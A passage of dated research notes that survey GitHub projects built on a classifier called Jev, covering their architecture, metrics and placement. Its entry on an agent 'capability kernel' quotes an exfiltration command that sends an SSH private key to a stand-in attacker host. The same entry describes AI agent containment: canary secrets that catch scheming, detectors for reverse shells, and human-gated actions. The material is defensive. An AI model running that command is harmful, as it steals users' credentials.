   https-only apiUrl. Opt-in is not "Jev is on."

### Placement

Applied keep/drop + mixed architecture + search/control (one
substituted classifier step inside Stagehand's loop). Pillar:
selective classification + VOI (pay for the LLM extract iff the
pick/gate fails). Hole: keep-drop / perceive / abstain. Family:
closed decision API (TypeSafe Jev). Fail-open to the LLM on the
speed path; fail-closed that the model never emits selectors or
invented extract text. Eval path: their 25×3 extract card + act/
observe suite numbers in the PR bodies (in-sample; not Harbor).
**Empirical** as PR-body architecture + their local eval. **Hypothesis**
that the envelope transfers to *your* sites. Cards:
`applied-mappings.md` §2 (primary); `mixed-architecture.md`;
`mappings.md` §9 / §12 / §18; `judgment-class.md`; `faq.md`;
`mental-models.md`; `validation.md`; `methods-catalog.md`;
`toolbox-mapping.md`; `agent-self-assessment.md`;
`question-design.md`. No wrapper.

### Omni / Jev-omni / Archer

Composition exemplar for browser CU: a11y snapshot → Jev decide →
copy/act. **Not** multimodal pixels for the extract pick path.
Screenshot extract stays with the LLM. Drawing-pixel claims and
Archer 27B are still **WATCH**. Track draft-stack merge.

### Cross-links

Cards: `applied-mappings.md` §2 (pick-and-copy); `mappings.md` §9
(harness loop; one substituted classifier step), §12 / §18
(envelope then remainder); `mixed-architecture.md` (LLM fallback;
cache-check fail-open); `judgment-class.md` (same job as
jev-ultrafast / gliner2-ultrafast / cua-s1 / solari);
`faq.md`; `validation.md` (their 37/75 card; pick ≠ replacement);
`question-design.md` (best+strict / none). No wrapper.

## 58. Public judgment wall, meaning-search without embeddings, attention≠correctness, skills→oxlint, session-sticky routing, measured RAG rerank (2026-09-18 ~18:46 Boise / 00:46 UTC 2026-09-19)

America/Boise ~18:46 = 2026-09-19T00:46Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no npm/Convex/uv/pnpm/dylib/venv how-to, no copied ports or
key-file paths. No invented metrics. Do not re-fold §50–§57
(Stagehand pick-and-copy is already §57). TypeSafe Jev is the
documented exemplar, not the monopoly. Augustus stays
how-to-apply / mental model / architecture / toolbelt +
jevals/Harbor practice.

Six HIGH **usage / architecture / measurement** signals: a
productized public primitive surface; meaning-search without
embeddings (Harbor-shaped frozen stripped-repo card); PR
attention ≠ correctness (anti-soundness-theater); skills→oxlint
(AST prove ∩ guidance remainder, not hard-gating); session-sticky
first-prompt model routing (fail-closed fallback); measured RAG
rerank vs a generative reranker (one-run; full-context Spark still
faster). Backend-agnostic categorization/scoring/decision-only
class.

### HIGH

1. **[`waynesutton/ask-jev-ai`](https://github.com/waynesutton/ask-jev-ai)**
   (JavaScript; created 2026-09-19T00:23:46Z; 0★ this pass;
   **license null / no LICENSE file this pass — do not invent**).
   Public realtime judgment wall: anyone asks in three to fifteen
   words; Jev answers yes / no / it depends in about 100 ms; every
   judged ask lands on the wall with a running count toward one
   million and the exact cost of getting there. Live
   [askjev.ai](https://www.askjev.ai). Built by Wayne Sutton as a
   demo of Jev and Convex. Not associated with TypeSafe AI.

   **README envelope (theirs; not a how-to).** One call per
   message. **Six questions** in that call: yes/no/it-depends;
   unkind; adult; targets a person; mood; topic. Policy lives in
   one file: `convex/questions.ts`. Browser + server
   profanity/allowlist (12,530-word human-verified list); IP +
   session rate limits; any safety probability **≥ 0.6** marks the
   ask `blocked`. Graceful **no-key** mode: without
   `TYPESAFE_API_KEY` posts publish on the allowlist alone and the
   UI says Jev is offline. Cost (theirs, from TypeSafe token
   counts, not estimates): Jev list price $0.042 / million input
   tokens, output free; a judged ask $0.000032–$0.000041 so far →
   **$32–$41 / 1M asks**. Tracker math is live from returned
   tokens.

   **Four load-bearing mental models.**

   1. **Productized System One primitive surface.** Most AI demos
      generate text. This one reads a sentence and returns typed
      answers with probabilities, then **code** decides what
      happens next (live / blocked / held). Same mixed-architecture
      slogan as Cambium / jevable class patterns (`notes.md` §56):
      keep in code what can be in code.
   2. **Cheap fan-out is the product.** Six independent questions
      in one request. Parallel answers are not a joint (`faq.md`).
   3. **Policy-in-code.** Thresholds, held-terms env, rate limits,
      allowlist, and the six-question set are reviewable modules —
      not a prompt. Fail-open no-key is named: missing judge ≠
      block and ≠ silent pass; the wall still runs.
   4. **Cost-to-1M is a measurement, not a slogan.** Token-count
      tracker, not an estimate. Harbor/jevals-shaped as *economics
      of a primitive*, not a taskset.

   **Cousins, do not merge.** TurboGuo arenas (MED this hour) are
   Jev-vs-chat *comparison* surfaces, not a public wall.
   [hunch](https://github.com/carldaws/hunch) is a language
   primitive, not a product. Do not copy npm / Convex / auth
   how-to.

   **Placement.** Mixed architecture (public primitive + policy)
   + applied-mappings gallery. Pillar: EU / selective
   classification. Hole: perceive / gate. Family: closed decision
   API. Fail-open on missing key (allowlist). Eval path: live
   cost tracker; no labeled accuracy card. **Empirical** as README
   / live site. **Hypothesis** that a public wall is the right
   primitive demo for *your* product. Cards:
   `mixed-architecture.md`; `faq.md`; `mental-models.md`. No
   wrapper.

2. **[`Bentlybro/jevgrep`](https://github.com/Bentlybro/jevgrep)**
   (Python; MIT; created 2026-09-19T00:09:47Z; 0★ this pass).
   Meaning-search CLI + MCP **without embeddings**. Command
   `jgrep`. Describe what the code *does*; get `file:line` ranges
   in about three seconds; no index to build. Tagline: grep needs
   the words; jgrep needs the job.

   **README / BENCHMARKS card (theirs; 228 questions on Flask,
   httpx, Django, AutoGPT; copies with every docstring and comment
   removed so no tool wins by matching copied wording):**

   | Right file in the top 5 | |
   |---|---|
   | **jgrep** | **79%** |
   | BM25 | 40% |
   | grep / ripgrep | 20% |

   Median: **1.4 s** on a 200-file repo, **2.9 s** Django (~3,600
   files), **3.1 s** AutoGPT (~4,300 files). About a cent per
   search. **When you already know the exact wording, keyword
   tools win** — BM25 top-10 **96% vs 85%**. Use grep for exact
   strings.

   **Why it's fast (theirs; toolbelt, not a how-to).** (1) Packed
   parallel: 1 file/request 0.36 s; 300 files 0.50 s — 3 files/s
   becomes 596 files/s. (2) All requests in flight. Ranking
   AutoGPT 4,329 files one-at-a-time ~23 min; packed+parallel
   **0.9 s**. (3) Stragglers cut off at 6 s (one stalled 40 s in
   testing). (4) Two stages: outline rank (path + symbol names),
   then zoom top **30** at function boundaries. (5) Disk nearly
   free (`os.scandir` + `git ls-files`; outlines cached by mtime).
   Full scripts in `bench/`. MCP tool `semantic_search`. Stage 1
   sees names, not bodies — a file whose names give nothing away
   can be missed. Each file/chunk judged alone, so "what calls X
   then Y" is out of scope. It finds; it does not explain. Don't
   point it at code you cannot send to a third-party API.

   **Harbor / jevals-shaped practice.** Frozen stripped-repo
   copies + labeled questions + comparable harnesses (jgrep vs
   BM25 vs grep). Honest negative on the exact-string slice.
   Not a Harbor taskset and not Wilson/McNemar published here —
   the *shape* is: write the score before picking a model; keep
   the keyword baseline. Do not invent 10–50×.

   **Cousins, do not merge.**
   [kazuhideoki/jev-search](https://github.com/kazuhideoki/jev-search)
   — recursive *file* search + fzf; max-over-chunks ≠ calibrated
   whole-file p (`notes.md` §55).
   [superagents-lab/jev-search](https://github.com/superagents-lab/jev-search)
   — federated *web*. [jev-sift](https://github.com/kbhuw/jev-sift)
   — classify-first MCP on path/url/text *before* the agent reads
   (`notes.md` §56); this tool *searches a codebase by meaning*.
   Do not copy `install.sh` / uv / `jgrep agents install`.

   **Placement.** Retrieve + bounded rerank (`mappings.md` §4) +
   toolbelt. Pillar: VOI + IR cascade. Hole: rank / gather.
   Family: closed decision API. Fail-open as ranking (keep a
   wider shortlist on error); do not fail-closed-drop a file.
   Eval path: their 228-q stripped-repo card. **Empirical** as
   that named receipt. **Hypothesis** that 79% top-5 transfers to
   *your* repo. Cards: `applied-mappings.md` §4; `mappings.md`
   §4; `validation.md`; `toolbox-mapping.md`. No wrapper.

3. **[`egma-ai/jev-reviewer`](https://github.com/egma-ai/jev-reviewer)**
   (JavaScript; MIT; created 2026-09-19T00:38:48Z; 0★ this pass).
   **Not** [`choxos/jev-reviewer`](https://github.com/choxos/jev-reviewer)
   (pointer-not-generator; line ids; verbatim copy; *not found*
   is an answer; `notes.md` §48). This product: Jev assigns PR
   **attention** P0 / P1 / P2; OpenAI writes behavior deltas (old
   logic / new logic / what changed / human review question).
   Priorities suggest where to spend attention, **not whether
   code is correct.** Anti-soundness-theater: a Noul is not a
   proof the PR is good (`formal-methods.md`).

   **README envelope (theirs; not a how-to).** Local CLI + skill
   + Chrome extension for reviewing **your own** coding-agent PRs
   on the same computer. **Does not publish PR comments** or send
   a report to teammates. Demo uses **real Jev classifications**
   and clearly labeled **prepared explanation copy**; live OpenAI
   explanations are implemented but verification is pending
   funded API access. Incomplete changed code escalates to
   `uncertainPriority` (P0 or P1, **never P2**).
   `alwaysReviewPaths` applies deterministic P0. Units are diff
   hunks with surrounding old/new source; default cap 12; excess
   stay **P0 / not analyzed**. Graphify is a local structural
   aid, not a complete runtime map. API failures are explicit;
   live never silently substitutes a fixture. Do not copy npm /
   `gh` / uv / pairing-token how-to.

   **Placement.** Mixed architecture (judge attention; generator
   writes; code owns P0 overrides) + Leveson sensor≠constraint.
   Pillar: SDT / org safety. Hole: triage / gate. Family: closed
   decision API + a generator sidecar. Fail-closed that
   incomplete never becomes P2; fail-open that a missing OpenAI
   explanation does not invent one. Eval path: demo provenance
   labeled; live OpenAI pending. **Empirical** as README
   architecture. **Hypothesis** as a measured attention ranking
   on *your* PRs. Cards: `mixed-architecture.md`; `faq.md`;
   `formal-methods.md`; `agent-self-assessment.md`. No wrapper.

4. **[`cephalization/jev-oxlint`](https://github.com/cephalization/jev-oxlint)**
   (TypeScript; created 2026-09-19T00:34:49Z; 0★ this pass;
   **license null this pass**). Skills → oxlint: turn a `SKILL.md`
   + `references/*.md` into a linter for mistakes a regex or type
   checker cannot see. Status: **experiment. Nothing is
   published.** The Phoenix example is real and validated live.

   **How a linter works (theirs; architecture, not a how-to).**
   Import scan → generic AST facts (redacted) → per-check
   **precheck** (clear-cut? report or skip without Jev) → routing
   Noul per reference file → **one** detailed request per file
   (state = `{ file, code, facts, guidance: <whole files> }`;
   questions = every applicable check + coarse hint). Three
   TypeSafe how-to-build rules: (1) **code decides everything it
   can**; (2) **policy in `state`** (guidance copied whole; path
   is the only coupling); (3) **questions atomic**. Modes: live /
   record / mock / off. Generative model sits **only** in
   `propose` (Claude drafts one check + fixtures + answer key);
   nothing generative is in the lint path. String literals
   redacted before any request.

   **Phoenix experiment (theirs; jev-1.13.0; fixtures + Phoenix
   `js/examples/apps`).** Jev agrees with the human answer key on
   **every fixture**, with wide margins (per-attribute PII:
   `token_count` 0.04, `patient_dob` 0.98, `chief_complaint` 0.98
   in one request — a keyword denylist is wrong in both
   directions). Found a **real bug** in a shipped example:
   langchain quickstart flushes only on the success path (noul
   **0.07** for "flushed on every exit path?"). Routing sharp:
   0.80–0.94 vs below 0.50 across 41 files; coarse hint ("does
   the code follow this whole file?") is **not**. Cost ~$0.002
   fixtures / ~$0.015 41 files with routing; **second run: zero
   requests**. A one-sentence docs edit moved a reference's
   relevance from below 0.50 to 0.90. `propose` drafted
   `annotation-identifier-collision` unprompted; first
   calibration agreed on all four fixtures.

   **Formal methods compose with soft judgment without
   hard-gating.** AST / precheck *prove* what they can; Jev
   scores the remainder; oxlint `warn` is not a discharged proof
   obligation. Same sandwich as jevscan AST∩semantic / Abide
   (linter owns hard rules) / jev-pref. **`tenbin` owns the lint
   skill.** Do not copy pnpm / `jsPlugins` how-to.

   **jevals-shaped practice.** Human answer key vs Noul on
   fixtures (calibrate); routing sharpness as a separate score
   from the coarse hint. Not a Harbor taskset.

   **Placement.** Structural prove ∩ remainder (`mappings.md`
   §18) + preference lint. Pillar: formal methods (sensor, not
   constraint). Hole: gate. Family: closed decision API. Fail
   polarity: experiment ships as warn; do not hard-gate CI on an
   uncalibrated remainder Noul. Eval path: Phoenix fixtures +
   answer key. **Empirical** as that named experiment.
   **Hypothesis** that survey/calibrate/propose transfers to
   *your* skill. Cards: `mappings.md` §18; `formal-methods.md`;
   `mixed-architecture.md`; `validation.md`. No wrapper.

5. **[`jxu-dev-c/jev-adaptive-thinking`](https://github.com/jxu-dev-c/jev-adaptive-thinking)**
   (Go; created 2026-09-19T00:35:37Z; 0★ this pass; **license
   null this pass**). CLIProxyAPI dylib plugin: only for
   `model: "jev-auto"`, classify the **first user prompt**, then
   **lock** provider/model for the rest of the process-local
   session. Default three tiers: simple →
   `deepseek-v4-flash:deepseek`; standard → `gpt-5.6-sol`;
   complex reasoning / architecture / hard debug →
   `gpt-5.6-astra`. Timeout, failure, or missing first-round
   text → **fallback and lock** `gpt-5.6-sol`. Concurrent
   first-round requests share **one** Jev call; later requests
   **never reclassify** (tool continuations, history compact,
   task-got-harder, upstream failure). No stable session ID →
   fallback, **no Jev, no cache**. Subagents isolated; parent
   session is not inherited. First-round images/audio →
   fallback. Bindings have no TTL; restart clears them. Manual
   other-model bypasses the plugin. Offline tests mock HTTP; this
   delivery left live Jev / host e2e / Linux build to the
   deployer. Do not copy dylib / YAML / home-log how-to.

   **Cousins.** Same family as
   [routeKit](https://github.com/rajdhakad9826/routeKit): Jev
   estimates requirements; **code** picks the model (`notes.md`
   §33). [jev-claw](https://github.com/trietphan/jev-claw)
   classifies axes then `decide()` maps. Contrast
   [jev-gateway](https://github.com/vinilana/jev-gateway)
   fail-open passthrough if Jev is down (`notes.md` §51): here
   the irreversible act is *sending a model*, so timeout locks a
   **declared standard**, not "let the client guess."

   **Placement.** Skill / tool routing (`applied-mappings.md`
   §5). Pillar: EU / cost-sensitive cascade. Hole: route.
   Family: closed decision API. Fail-closed to standard on
   timeout / no session. Eval path: `make live-test` is three
   billed Jev requests for a human to inspect — not a labeled
   catalog. **Empirical** as README session machine.
   **Hypothesis** until measured on *your* catalog. Cards:
   `applied-mappings.md` §5; `mixed-architecture.md`; `faq.md`.
   No wrapper.

6. **[`Max-sm-yc/Jev-RAG`](https://github.com/Max-sm-yc/Jev-RAG)**
   (Python; created 2026-09-19T00:33:02Z; 0★ this pass;
   **license null this pass**; no GitHub description). Basic RAG
   pipeline: vector search, Jev rerank, Muse Spark 1.3 write.
   **One-run** (theirs) over ~30k tokens; output 1000–1400
   tokens; **costs include embeddings:**

   | Path | Cost | Time |
   |---|---|---|
   | RAG + Jev rerank + Spark | $0.00122838 | 62.3 s |
   | RAG + Spark rerank + Spark | $0.00421838 | 228.14 s |
   | Spark full context, no RAG | $0.0032 | **10.60 s** |

   README claim: Jev rerank cut total cost **over 70%** and total
   response time **72%** — that is **vs Muse Spark rerank**, not
   vs no-RAG. Full-context Spark is still **faster** (10.60 s)
   and cheaper than the Spark-rerank path. Do not overclaim
   latency against "just send the context." Do not invent a
   bake-off. Do not copy venv how-to.

   **Cousins.** Same sandwich as
   [decision-native-rag-skills](https://github.com/emergency-lee/decision-native-rag-skills)
   (`notes.md` §55; Hypothesis as a measured win) and
   [llama-index-jev](https://github.com/WiktorB2004/llama-index-jev)
   (BEIR nfcorpus Empirical). Independent IR card:
   [carlaiau/jev-reranking](https://github.com/carlaiau/jev-reranking)
   TREC DL2019. jevgrep (this section) is meaning-search of a
   *repo*, not RAG of a corpus.

   **Harbor / jevals-shaped practice.** One-run product-loop
   comparison with a named generative-rerank baseline and a
   no-RAG arm. Label n=1. Keep the faster full-context arm
   visible (honest negative on latency).

   **Placement.** Retrieve + bounded rerank (`mappings.md` §4).
   Pillar: VOI. Hole: rank. Family: closed decision API.
   Rerank fail-open (keep retrieval order on error); *select*
   fail-closed. Eval path: this one-run table. **Empirical** as
   that named receipt. **Hypothesis** that ≥70% / 72% vs Spark
   rerank transfers. Cards: `mappings.md` §4;
   `applied-mappings.md` §4; `validation.md`. No wrapper.

### MED

- **[`EpicEric/safe-sh`](https://github.com/EpicEric/safe-sh)**
  (Python; AGPL-3.0; created 2026-09-18T23:53:50Z; 0★). Static
  **shell script** analysis with Jev. Thresholds `--warn-on` /
  `--error-on`. Same *family* as jevgate / toolgate (judge a
  remainder after you already hold the text) — this is static
  analysis of a script, **not** pre-exec authorization of a
  proposed tool. Jev is not authorization. Do not copy `uv run`
  pipe how-to.
- **[`ravikadam/jev-loan-triage`](https://github.com/ravikadam/jev-loan-triage)**
  (JavaScript; created 2026-09-19T00:31:39Z; 0★; **license null
  this pass**). Voice loan-call triage: ASR → **17 typed
  questions in one request** → `loan.js` policy (interested /
  enough-info checklist / 4-way decision). Fraud or pressure →
  human review; no approval while key facts missing; low
  confidence → human review. The "why" and follow-ups are built
  **in code** from checklist/risk flags. Jev returns judgments,
  not text. Thresholds are starting points. Live Cloud Run with
  IP / transcript / instance caps. Do not copy gcloud / env.
- **TurboGuo demos (found this pass; prior empty search was a
  query miss, not absence).**
  [`TurboGuo/jev-fedspeech`](https://github.com/TurboGuo/jev-fedspeech)
  (JS; created 2026-09-19T00:26:43Z; license null; live
  [fedspeech.pages.dev](https://fedspeech.pages.dev)) — hawk/dove
  on Fed press conferences; Jev scores **every word** ~150 ms
  vs chat models on caption lines; same four stances.
  [`TurboGuo/jev-dating`](https://github.com/TurboGuo/jev-dating)
  (JS; created 2026-09-19T00:26:38Z; license null; live
  [jevdating.pages.dev](https://jevdating.pages.dev)) — red-flag
  / interest meter; same-standard Jev vs chat. Productized
  primitive-vs-generation **arena**, cousin of ask-jev-ai (wall)
  not a second wall. Not financial advice; dating demo is not
  mind-reading. Do not copy wrangler how-to.
- **[`g-h-miles/jevbox`](https://github.com/g-h-miles/jevbox)**
  (TypeScript; MIT; created 2026-09-19T00:26:29Z; 0★). Drum
  grooves with Jev: five kits, four bars, MIDI export. Jev
  arranges each bar with previous bars as context. Kit affects
  preview audio, not the exported instrument. Mixed
  architecture: judgment for arrangement; synthesis / timing /
  undo in code. Do not copy Worker / secret how-to.
- **hermes / mcp packs.** GitHub search this pass returned **no
  new pack**. Existing
  [hermes-jev-north-star](https://github.com/poponline63/hermes-jev-north-star)
  (deterministic checks then Jev finish gate) and
  [jev-hermes](https://github.com/de-niji/jev-hermes) (route ≠
  memory) stay as already folded. Do not invent a pack.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. Public walls, meaning-search,
and oxlint remainder are **not** that drop. TurboGuo word-level
Fed scoring is text, not pixels.

### Cross-links

Cards: `applied-mappings.md` §4 (jevgrep + Jev-RAG), §5
(session-sticky route); `mappings.md` §4 (meaning-search /
rerank), §18 (jev-oxlint AST∩remainder; safe-sh MED);
`mixed-architecture.md` (public wall; attention≠correctness;
fail table); `validation.md` (jevgrep 79% top-5; Jev-RAG
one-run; oxlint Phoenix fixtures); `faq.md`;
`mental-models.md`; `methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`; `formal-methods.md`. No wrapper.

## 59. Capability kernel, typed DSPy control plane, calibration arena + fan-out suite, engine-owns-truth chess coach, human-confirmed port cleanup (2026-09-18 ~19:48 Boise)

America/Boise ~19:48 = 2026-09-19T01:48Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no pip/hook/venv/.env/uv/npm/pnpm/wrangler how-to, no copied
ports or key-file paths. No invented metrics. Do not re-fold
§50–§58. TypeSafe Jev is the documented exemplar, not the
monopoly. Augustus stays how-to-apply / mental model /
architecture / toolbelt + jevals/Harbor practice — **not** a
thin Jev skill.

Five HIGH **usage / architecture / measurement** signals: a
capability kernel (LLM ring 3; Interlock ring 0; Jev is a
SENSOR; `policy.py` decides); a typed deterministic control
plane around DSPy (classifier → ontology → security override
→ confidence → state machine → tool allow-list; DSPy drafts
AFTER route+action are fixed); a native-probability calibration
arena plus a fan-out measurement-economics suite (sonar /
vickrey / bracket); formal engine + soft judgment composition
(Stockfish owns truth; Jev owns judgment); evidence-backed
human-confirmed kill (Jev recommends; the human is the only
trigger). Backend-agnostic categorization/scoring/decision-only
class.

Skip this pass: [`SPFreedom/jef-mcp`](https://github.com/SPFreedom/jef-mcp)
(parody of TypeSafe Jev; description says so) and
[`rayelzz/jevregist`](https://github.com/rayelzz/jevregist)
(account farming / key-pool registrar). Do not index as
placements.

Star spike this day (watch numbers, then this-pass live):
[`TheoLeeCJ/SemIf`](https://github.com/TheoLeeCJ/SemIf) 1491→1606
(this pass **1607★**); [`vinnylarouge/jevlike`](https://github.com/vinnylarouge/jevlike)
851→896 (this pass **897★**). Already-folded open-head /
encoder-class neighbors; no new card.

### HIGH

1. **[`somoore/interlock`](https://github.com/somoore/interlock)**
   (Python; MIT; created 2026-09-19T01:41:58Z; 0★ this pass).
   Capability kernel: **the kernel the LLM is not allowed to
   talk to.** Interlock is ring 0. The LLM is ring 3. An
   untrusted agent never holds a real secret, never talks to
   the network, and never sees the real filesystem. It works
   on a **stunt-double** world: canary AWS keys, fake `.env`,
   a closed allowlisted action space. Jev (or a bundled System
   One stand-in) is the **sensor**. **`policy.py` is the
   product.** The model never picks allow / ask / block.

   Pipeline (README): LLM plans → Interlock kernel → (1)
   deterministic detectors (C2, reverse shell, canaries,
   paths) → (2) parallel Noul battery (twelve hazards,
   ~100 ms) → (3) policy in ordinary code: BLOCK / ASK
   (human) / ALLOW + placeholder swap at egress.

   **Anti-pattern named in the README:** launch-week Jev
   firewalls ask "is this tool call dangerous?" **after** the
   LLM already decided, with **real secrets still in scope**.
   Interlock changes the trust model: secrets never enter the
   agent (placeholders and canaries only); canaries are
   active (any use is a catch, including silent scheming with
   no injection); the action space is closed (the kernel
   cannot emit `curl evil.com?$(cat ~/.ssh/id_rsa)` because
   that string is not an option); **type-safe is not the same
   as correct** — irreversible actions stay behind a
   threshold **and** a human. Prompt injection can hijack
   intent; it cannot hijack the instruction set.

   38-case regression set (attacks, benign, hard negatives /
   authorized destruction): used to tune the local judge,
   **not a blind paper**. Wire Jev and run your own held-out
   attacks before you trust a number. `INTERLOCK_ARMED=1` is
   theirs; do not copy pip / hook how-to.

   **Do not merge with toolgate.**
   [`fdemir/toolgate`](https://github.com/fdemir/toolgate)
   is a pre-exec product on a *proposed* tool call (allow /
   block / review) — real args may already be in scope; Jev
   is still not authorization. Interlock is a **capability
   kernel**: the LLM never saw the secret and cannot emit an
   unlisted action. Same Leveson split (sensor ≠ constraint);
   different trust boundary. rh-guard crossover: eval-integrity
   / reward-hacking is a *different hole* from a ring-0
   kernel; do not merge products. Placement: `mappings.md` §8
   (sensor ≠ constraint) and §18 (closed action space as the
   prove layer); `applied-mappings.md` §7; `mixed-architecture.md`
   fail table. Pillar: org/safety (Leveson). Hole: gate.
   Family: closed decision API as sensor. **Empirical** as
   README architecture. **Hypothesis** as a shipped kernel
   you can trust. No wrapper.

2. **[`manikanda-kumar/jev-dspy-control-plane`](https://github.com/manikanda-kumar/jev-dspy-control-plane)**
   (Python; MIT; created 2026-09-19T01:36:58Z; 0★; description
   null this pass). Benchmark-first experiment: **can a
   constrained classifier be a typed control plane around a
   probabilistic DSPy agent?** Free-form banking-support cases
   enter a closed ontology; deterministic confidence and
   safety rules apply; only allow-listed tools may run; DSPy
   drafts the customer-facing response **after** the route
   and action are fixed. Engineering experiment, not a
   production bank. Tools are deterministic mocks.

   Three pipelines share ontology, dataset, state machine,
   tool allow-list, and metrics: `jev` (OpenJEV System One,
   OpenJEV Hugging Face NLI, or offline heuristic), `dspy`
   (DSPy typed signature), `json_schema` (OpenAI-compatible
   strict JSON Schema). Architecture: classifier adapter →
   typed control plane (ontology validation → security
   override → confidence thresholds → state-transition
   validation → tool allow-list) → DSPy/template **after**
   fixed route+action. An LLM may explain; it cannot add a
   route, change the selected action, or invoke an unapproved
   tool. Banking ontology: **10 intents / 39 sub-intents**.
   Unknown combinations cannot silently pass. Fraud/security
   forces a human-security path even if the classifier
   predicts a routine intent.

   Offline smoke uses a heuristic + labelled **contract
   stubs**. A high offline score is **plumbing regression,
   not model generalization** (synthetic generator and
   heuristic share route vocabulary). Metrics named (Harbor-
   shaped): intent/sub-intent accuracy; invalid-output /
   policy-violation; abstention / coverage / selective
   accuracy; Brier / ECE; repeated-run consistency; p50/p95
   latency; per-category stress (clean / typo / code-mixed /
   adversarial / ambiguous); token cost when a backend
   exposes usage. **Accuracy alone is not enough.** A
   negative result is also valuable (poor calibration on
   banking language, multilingual miss, cost as the route
   set grows) — next step is labelled calibration or a
   hierarchical scorer, not a more persuasive chat response.

   Mental model: Ax/DSPy stay **LM-program knob climbers**
   (`optimizer-integration.md`). The control plane is
   typed + deterministic and sits *around* the LM program,
   not inside GEPA/MIPRO. Do not copy venv / `.env` how-to.
   **Empirical** as README architecture + metric list.
   **Hypothesis** as a measured OpenJEV vs DSPy vs JSON
   Schema bake-off (offline stubs ≠ that bake-off). Cards:
   `optimizer-integration.md`; `validation.md`; `faq.md`.

3. **[`meetr1912/jev-arena`](https://github.com/meetr1912/jev-arena)**
   (Python; MIT; created 2026-09-19T01:28:11Z; 0★) plus
   sibling fan-out suite
   [`jev-sonar`](https://github.com/meetr1912/jev-sonar)
   (created 2026-09-19T01:30:34Z),
   [`jev-vickrey`](https://github.com/meetr1912/jev-vickrey)
   (created 2026-09-19T01:28:15Z),
   [`jev-bracket`](https://github.com/meetr1912/jev-bracket)
   (created 2026-09-19T01:28:20Z) — all MIT, Python, 0★.

   **Arena (The Honesty Meter).** Calibration on
   analytically-known worlds (biased coin, integer-count
   urns, standard deck, uniform hidden integer). Collects
   Jev's **native** `noul` / `choice` / `score` probabilities
   — not verbalized "I'm 80% sure." Oracle stub Brier/ECE
   **0.0000** (ground truth is exact, not sampled). Live
   smoke: Jev assigns **0.89** to face "1" of a *fair* die —
   miscalibration is visible, not a victory lap.

   **Live run (theirs; `--live --trials 200 --seed 7`,
   `jev-1.13.0`, committed under `results/`):** 145 binary
   (`noul`) events, **Brier 0.0059**, log loss **0.5393**,
   **ECE 0.0620**, **2 requests / 710 ms** (~3.6 ms/event;
   13,566 in / 5,468 out). Always-0.5 Brier 0.0766 / ECE
   0.1371. Oracle 0.0000. Jev is stochastic; an earlier run
   scored Brier 0.0063 / ECE 0.0642. Reliability is
   systematically **overconfident in the low bins** and
   near-perfect in the high bins (e.g. [0.1, 0.2) pred
   0.166 / emp 0.096, n=18; [0.9, 1.0) pred 0.920 / emp
   0.950, n=2). Categorical 55 events: multiclass Brier
   **0.1915**, cross-entropy 2.0571; damage concentrated in
   weighted-die and deck (ECE 0.109 / 0.084). Risk-coverage:
   decisiveness `d = |p-0.5|*2`; `d ≥ 0.25` covers **76.6%**
   at **100%** accuracy; `d ≥ 0.10` covers 94.5% at 99.3%.
   Fan-out as **measurement economics**: 200 questions in 2
   requests. Offline default; CI has no secrets. Cite these
   numbers as *theirs*; do not invent a re-run.

   **Sonar — heatmap-as-policy.** Battleship: ~100 `noul`
   per turn ("will firing here hit?") + one `choice`;
   `noul` argmax is the shot (ties → lowest row, then
   column). Live empty board: **101 questions in 0.454 s**.
   Offline oracle 20 games seed 11: win **75%**, per-shot
   Brier **0.1615** vs 0.25 always-0.5. Live one game:
   0W/1L, Brier **0.1092** — small sample; the point is
   per-turn fan-out + field calibration. Status:
   implementation tracked in the suite; design done.

   **Vickrey — threshold fan-out CDF.** Jev **never bids**.
   ~11 `noul` threshold probes + one `choice` band + one
   `score`; code monotonizes the CDF and bids. Second-price
   truthfulness is weakly dominant, so miscalibration *is*
   the loss. Live 20 rounds: Brier **0.1391**, ECE
   **0.1321**, under-confident at 0/1 thresholds;
   second-price profit **-163.4**; coarse `choice` band MAE
   **$26.86** beat the threshold-CDF estimate. Offline
   oracle second-price regret **0.0** / truthfulness
   **0.0000**. Overconfident stub loses money (teeth).
   Synthetic; no real marketplace.

   **Bracket — tournament Brier vs Elo.** 32 synthetic
   teams; one `noul` per matchup; 5 requests / 31 questions
   / **1.19 s** live. Live: Jev Brier **0.2853** vs Elo
   **0.2322** vs seed **0.4077** vs oracle **0.2204**;
   overconfident ECE **0.1965**; **+0.300 vs seed, −0.229
   vs Elo.** Honest: trailed Elo. Offline oracle Brier
   **0.2282**. This is **not** the rejected 255-way Choice
   tournament (SKILL non-negotiable): engine-owned matchups,
   scalar `noul` per game, scored with a proper rule.

   Harbor / jevals-shaped practice: native probabilities,
   exact oracle, Brier/ECE/reliability/risk-coverage, teeth
   stubs, offline default. Cards: `validation.md`;
   `faq.md` (native ≠ verbalized confidence); `methods-catalog.md`;
   `toolbox-mapping.md`. **Empirical** as their live/offline
   cards. No wrapper.

4. **[`JoelLewis/game-coach`](https://github.com/JoelLewis/game-coach)**
   (TypeScript; **GPL-3.0-only**; created 2026-09-19T01:08:53Z;
   0★). Browser chess coach on Cloudflare. README status:
   **Wave 0** (scaffold and Jev feasibility spike). Product
   spec: `docs/PRD.md`. Treat the PRD as **Empirical as spec**;
   the shipped product is **Hypothesis**.

   Three-layer composition: **Stockfish (WASM) owns truth**
   about the position (eval, best line, swing). **Jev owns
   judgment** after every player move (severity, error class,
   interrupt, teachable, template, theme, …). Templates + a
   small writing model own the words. Jev never evaluates
   positions or picks moves. Code owns the workflow
   (thresholds, weighting, the final action). Silence is a
   feature.

   PRD envelope (theirs; not a how-to): 11 parallel questions
   per move; interrupt if `interrupt_now ≥ 0.7` AND
   `severity ≥ 2` AND confidence `≥ 0.6`; writing model only
   if `teachable ≥ 0.8`, cap **3/game** plus one narrative;
   confidence `< 0.4` → silent, flagged for review. Cost
   model ~**$0.012** per chess game (Jev ~$0.003; writing
   model is the main dial). Calibration *targets* (not
   results): severity ≥80% exact / ≥95% adjacent; interrupt
   precision ≥85% at 0.7; teachable precision ≥75% at 0.8;
   ECE within 10 points per bin. Do not copy Wrangler /
   Workers AI binding as a how-to.

   Anti-soundness-theater exemplar **alongside** egma-ai
